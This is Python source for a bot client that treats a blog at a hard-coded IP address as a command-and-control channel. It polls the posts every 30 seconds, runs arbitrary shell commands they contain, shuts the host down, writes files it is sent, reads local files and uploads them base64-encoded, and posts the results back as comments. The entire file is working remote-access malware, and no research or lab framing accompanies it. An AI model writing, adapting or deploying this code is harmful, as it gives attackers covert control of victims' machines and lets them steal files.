import requests
import subprocess
import re
import base64
import string
import secrets
import uuid
from time import sleep
from bs4 import BeautifulSoup

URL='http://192.168.1.10'
COMPLETE_ACTIONS={}
UUID = str(uuid.uuid4())

def get_page():
    r = requests.get(URL)
    return BeautifulSoup(r._content, features="html.parser")

def get_posts(soup):
    return soup.findAll("div", {"class": "post-post"})

def send_comment(payload):
    r = requests.post(URL + '/newcomment', data=payload)
    return r

def run_command(command):
    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    stdout_v = proc.stdout.read() + proc.stderr.read()
    output = stdout_v.split()
    return output

def process_actions(posts):
    for post in posts:
        a_date = post.find("span", {"class": "post-date"}).getText()
        a_post = post.find("p", {"class": "post-body"})
        if a_date in COMPLETE_ACTIONS:
            print("Already ran command {0}".format(a_post))
        else:
            action = a_post.attrs.get("data-action",)
            if action == "shutdown-host":
                command = "shutdown /s /t 0"
                data = run_command(command)
            elif action == "shutdown-client":
                exit()
            elif action == "get-mac":
                command = "ipconfig /all | findstr /i \"Physical\""
                results = run_command(command)
                data = [item for item in results if len(item) == 17]
            elif action == "download-file":
                text = a_post.get_text()[2:-1]
                contents = base64.b64decode(text)
                filename=secrets.choice(string.ascii_uppercase)\
                    +secrets.choice(string.ascii_lowercase)+secrets.choice(string.ascii_lowercase)\
                    +secrets.choice(string.digits)+secrets.choice(string.digits)+secrets.choice(string.digits)\
                    +secrets.choice(string.ascii_lowercase)
                with open(filename,'w+b') as f:
                    f.write(contents)
                data = "Saved file as {0}".format(filename)
            elif action == "upload-file":
                filename = a_post.get_text()
                try:
                    with open(filename,'r+b') as f:
                        data = base64.b64encode(f.read())
                except:
                    data = "Failed to open the file"
            elif action == "shell-command":
                command = a_post.getText()
                data = run_command(command)

            post_id = post.find("a")['href'].split('/')[-1]
            data = '{0}, {1}, {2}'.format(UUID, action, str(data))
            payload = {'username': 'bot', 'body': data, 'post_id': post_id, 'action': action}
            status = send_comment(payload)
            print('Status: {0}'.format(status))
            COMPLETE_ACTIONS[a_date] = a_post

while(True):
    page = get_page()
    posts = get_posts(page)
    process_actions(posts)
    sleep(30)
